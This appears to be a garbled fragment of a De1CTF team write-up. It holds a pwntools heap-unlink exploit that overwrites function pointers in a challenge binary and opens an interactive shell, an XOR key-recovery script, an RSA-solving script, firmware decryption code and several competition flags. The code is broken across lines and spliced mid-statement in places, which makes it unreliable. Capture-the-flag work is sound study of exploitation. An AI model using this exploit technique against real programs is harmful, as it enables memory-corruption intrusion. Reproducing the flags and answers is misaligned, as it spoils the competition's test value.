add(0xf8)#8
add(0xf8)#9
edit(5,p64(0)+p64(0x101)+p64(0x6020f0-0x18)+p64(0x6020f0-0x10)+(0x108-
0x28)*'\x00'+p64(0x100))
dele(6)
edit(5,p64(0x10)+p64(0x6020f0)+p64(0x200)+p64(0x6020f0)+p64(0x200)+p64(0)*2+p6
4(0x602030)+p64(0x200)+p64(0x602060)+p64(0x200)+p64(0x602058)+p64(0x200))
edit(7,p64(0x400ace)[:-1])
edit(8,p64(0x400afe)[:-1])
edit(9,p64(0x400afe)[:-1])
p.recvuntil('>>')
p.sendline('5')
raw_input()
p.sendline('\x00'*(off32-
4)+p32(0)+p32(0x8048440)+p32(9504)+p32(0x8048926)+p32(0x804a8e8+0x30))
p.interactive()
salt = "WeAreDe1taTeam"
si = cycle(salt)
babyrsa
cipher 
='49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c322235
7e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f0363
7f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36
265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d6714
28026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78
742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72
725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a4232462906444103
6c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e40
3a2b42356a727a04662b4446375f36265f3f124b724c6e34654470627764102506342001662922
5b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f336172647806
56537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c3369
6c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d
4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22
507b22705a226c6d446a37375761423a2b5c29247163046d7e4703224437750830075172712632
6f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a
41316362146e581d7c1228717664091c'.decode('hex')
si = cycle(salt)
tmp = [ord(c) ^ ord(next(si)) for c in cipher]
dic = [set() for _ in range(0x100)]
table = string.printable
for i in string.letters + string.digits + '_-, .()':
    for j in string.letters + string.digits + '_-, .()':
        dic[ord(i) ^ ord(j)].add((i))
for key_length in range(1, 38):
    for i in range(key_length):
        s = copy.deepcopy(dic[tmp[i]])
        for j in range(i, len(tmp), key_length):
            s &= dic[tmp[j]]
        if not len(s):
            break
        elif i == key_length - 1:
            print key_length
key_length = 30
for i in range(key_length):
    s = copy.deepcopy(dic[tmp[i]])
    for j in range(i, len(tmp), key_length):
        s &= dic[tmp[j]]
    print key_length,i,s
flag ="de1ctf{"+'W3lc0m3tOjo1nu5'+'W3lc0m3tOjo1nu5'[::-1] +'}'
print flag
import binascii
import gmpy2
import libnum
# from data import e1, e2, p, q1p, q1q, hint, flag
p = 
109935857933867829728985398563235455481120300859311421762540858762721955038310
117609456763338082237907005937380873151279351831600225270995344096532750271070
807051984097524900957809427861441436796934012393707770012556604479065826879107
677002380580866325868240270494148512743861326447181476633546419262340100453
# solve RST to get p
ee1 = 42
ee2 = 3
ce1 = 
457226517863401239469608150030593225288104818413782472806428685536076921495091
269628725830371424613988066894891417414949748368823415052342553256832190921630
528434616323384425290115023789311403561117569327128225168140231660689025694582
999333919735040788989589218097233462298939136625772949635283184246768039422883
864301724308803076197481868638900501139345738205055709281090178426475982666343
444471823478493677145646863418710075058867283937511470335568892176046473556285
575022083644122699449080113050641229414465169901689247096840922001838606531738
56272384
ce2 = 
139084683323335671584691364399323259923496968891291039354007602393194544095397
253897470592138352383730478991982111286893740497295781468753092319629365544032
878829999678403462166952084245827397770342610795503959180484210868439270094524
799360458507990967500743591607751822389809892291901575511978308798770977033473
010724271494749918038683257699673323569508635185049654865654640597704514585577
449497352821317279560562792928006942038661672702689884373899457031170706044889
992477501395686149399658852112768219875868829081595858635145611919050402449676
55444219603287214405014887994238259270716355378069726760953320025828158
tmp = 
864078778078609835167779565982540757684070450697854309005171742813414963447462
554999012718960925081621571487444725528982424037419052194840720949809891134854
871222612682162490991065015935449289960707882463387
n = 
159115815557967986147116252885083097047918375162321224104409588307260788210690
504040128208962600717513804369927106383642946581735711015969316057975097128396
224793688502512064197480900597524273036117600046213782264312269836657468377790
562715301818656481158629475272127878246295162048323130264563900477681747656870
409506365304805490144012790543460980303951003870041115742788137496309867247062
636551662895862304539759537737919454085894846793718541134577581574922412251809
070902351163250348229937484090115546731804943060032728369050824734750462775540
85737627846557240367696214081276345071055578169299060706794192776825039
e1 = gmpy2.iroot(ce1, ee1)[0]
e2 = 0
for i in range(100000):
    if gmpy2.iroot(ce2 + i * n, ee2)[1]:
        e2 = gmpy2.iroot(ce2 + i * n, ee2)[0]
        break
e2 = e2 - tmp
assert(pow(e1, ee1, n) == ce1)
assert(pow(e2 + tmp, ee2, n) == ce2)
e = 46531
c = 
149921321409961603309673075585031172556269257774266119785183390506710130414907
246168926349110309183608679748943715391608538271805961008921807357706887232707
653876976044267156704452708196267093645664787812736761159216579677614946194480
952071693863645411646591232732368746498882364333991274078018434126772935169863
981901652911021093104583046262616483468251967435392201981993667118581352718776
624103555857671240595392172746916068251033553103486076112330527258052367632203
432498738496462198509549453467910158582617159679524610216503073074544345108518
69862964236227932964442289459508441345652423088404453536608812799355469
# just factor n since p,q too close
q1q = 
127587319253436643569312142058559706815497211661083866592534217079310497260365
307426095661281103710042392775453866174657404985539066741684196020137840472950
102380232067786400322600902938984916355631714439668326671310160916766472897536
055371474076089779472372913037040153356437528808922911484049460342088835693
q1p = 
127587319253436643569312142058559706815497211661083866592534217079310497260365
307426095661281103710042392775453866174657404985539066741684196020137840472950
102380232067786400322600902938984916355631714439668326671310160916766472897536
055371474076089779472372913037040153356437528808922911484049460342088834871
# hint = int(binascii.hexlify(hint), 16)
assert(q1p * q1q == n)
assert(q1p = 252:
            xorkey = 1
        c ^= ord(userkey[i%len(userkey)])
        ret += chr(c)
    return ret
key = perm2('BIuS1CVMEQG+0pUeE99jnR+vLlLd9unr', 'welcome_2_De1CTF')
iv = perm2('f3+odwHhmJL1ceW1', 'welcome_2_De1CTF')
ﬁrmware.bin
binwalk -e
ﬂag de1ctf{Th1s_i5_r3al_f1rmw4re_3ncryp+i0n}
Mine Sweeping
Just patch the game.
from Crypto.Cipher import AES
aes = 
AES.new('342e1a345b28341a7e0408420c3d0e33234e461d142959316729131d15282514'.dec
ode('hex'), AES.MODE_CBC, '105444080e1c2a3f561f03585f280c67'.decode('hex'))
f = open('firmware.bin', 'rb')
enc = f.read()
dec = aes.decrypt(enc)
o = open('firmware.dec', 'wb')
o.write(dec)
o.close()
f.close()